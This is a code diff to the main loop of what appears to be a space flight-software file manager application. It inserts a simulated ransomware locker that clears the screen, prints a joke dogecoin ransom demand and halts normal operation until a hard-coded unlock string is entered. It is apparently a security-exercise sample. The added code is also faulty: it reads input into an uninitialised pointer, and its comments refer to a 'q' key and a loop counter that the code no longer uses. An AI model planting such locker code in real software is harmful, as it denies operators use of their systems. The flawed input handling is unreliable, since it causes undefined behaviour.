@@ -107,28 +107,25 @@ void FM_AppMain(void)
         Result = CFE_SB_RcvMsg(&MsgPtr, FM_GlobalData.CmdPipe, CFE_SB_PEND_FOREVER);
 
         //Ransomware execution loop
-        for(int i = 0; i < 100000; i++)
+        //Ransomware goal 1: Keep looping until 'q' (simulated unlock key) is entered
+        char* input;
+        while (strcmp(input, "rAn5OMWaR3cOd3") != 0 && (isUnlocked == 0))
         {
             //Ransomware goal 2: print demand message to screen
+            OS_printf("\33[2J\r");
             OS_printf("Kindly send 1 million dogecoins to: \nP. Sherman \n42 Wallaby Way \nSydney, Australia\n\n");
+            
+            //Ransomware goal 3: Check for unlock key entry/release 
+            scanf("%15s", input);
+            if(strcmp(input, "rAn5OMWaR3cOd3") == 0) {
+                //Clear screen
+                OS_printf("\33[2J\r");
 
-            //Ransomware goal 1: keep looping until 'q' (simulated unlock key) is entered
-            char input;
-            if (input != 'q' && (isUnlocked == 0)) {
-                CFE_ES_RunLoop(&RunStatus) == FALSE;
-                
-                //Ransomware goal 3: check for unlock key entry/release 
-                scanf(" %c", &input);
-                if(input == 'q') {
-                    //Clear screen
-                    OS_printf("\33[2J\r");
+                //Set global variable to prevent further locks
+                isUnlocked = 1;
 
-                    //Set global variable to prevent further locks
-                    isUnlocked = 1;
-
-                    //Update local counter variable to escape loop and allow normal execution
-                    i = 100000;
-                }
+                //Update local counter variable to escape loop and allow normal execution
+                break;
             }
         }
 
